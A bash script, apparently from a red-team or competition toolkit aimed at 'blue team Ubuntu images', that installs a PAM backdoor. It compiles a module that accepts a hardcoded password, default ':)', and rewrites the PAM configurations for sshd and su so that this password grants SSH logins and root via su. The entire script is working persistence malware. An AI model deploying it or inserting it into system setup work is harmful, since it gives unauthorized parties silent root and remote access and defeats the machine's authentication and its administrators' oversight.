#! /bin/bash

# Name: PAM Backdoor
# Notes: 
# - Installs backdoored PAM module
# - Configures sshd and su to use this module
# - Password prompts will accept BD_PASSWORD
# - Environment Variables:
#   - BD_PASSWORD (default=":)")
# Valid Targets: Blue team Ubuntu images

echo "Setting up pambd..."

if [[ ! -v BD_PASSWORD ]]
then
BD_PASSWORD=":)"
fi

echo "Installing PAM module..."

mkdir /tmp/pambd
cd /tmp/pambd

# Source: https://github.com/ociredefz/pambd
MOD="
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#define MYPASSWD \"$BD_PASSWORD\"

PAM_EXTERN int pam_sm_setcred
(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt
(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate
(pam_handle_t *pamh, int flags,int argc, const char **argv) {
    char *password = NULL;

    pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&password, NULL);

    if (!strncmp(password, MYPASSWD, strlen(MYPASSWD)))
        return PAM_SUCCESS;

    return -1;
}"

echo "$MOD" | sudo tee pambd.c > /dev/null

sudo apt install gcc libpam0g-dev -y
gcc -fPIC -c pambd.c

sudo ld -x --shared -o /lib/x86_64-linux-gnu/security/pam_bd.so pambd.o

sudo rm -rf /tmp/pambd

echo "Configuring PAM..."

SSHD_CONFIG="
auth    sufficient pam_unix.so

account    required     pam_nologin.so


@include common-account

auth    sufficient    pam_bd.so
account	   sufficient    pam_bd.so

session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close

session    required     pam_loginuid.so

session    optional     pam_keyinit.so force revoke

@include common-session

session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate

session    optional     pam_mail.so standard noenv # [1]

session    required     pam_limits.so

session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale

session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open

@include common-password
"

echo "$SSHD_CONFIG" | sudo tee /etc/pam.d/sshd > /dev/null

SU_CONFIG="
auth       sufficient pam_rootok.so

session       required   pam_env.so readenv=1
session       required   pam_env.so readenv=1 envfile=/etc/default/locale

session    optional   pam_mail.so nopen

session    required   pam_limits.so

@include common-account
auth    sufficient pam_unix.so
auth    sufficient    pam_bd.so
account	   sufficient    pam_bd.so
@include common-session
"

echo "$SU_CONFIG" | sudo tee /etc/pam.d/su > /dev/null

echo "Done configuring pambd."
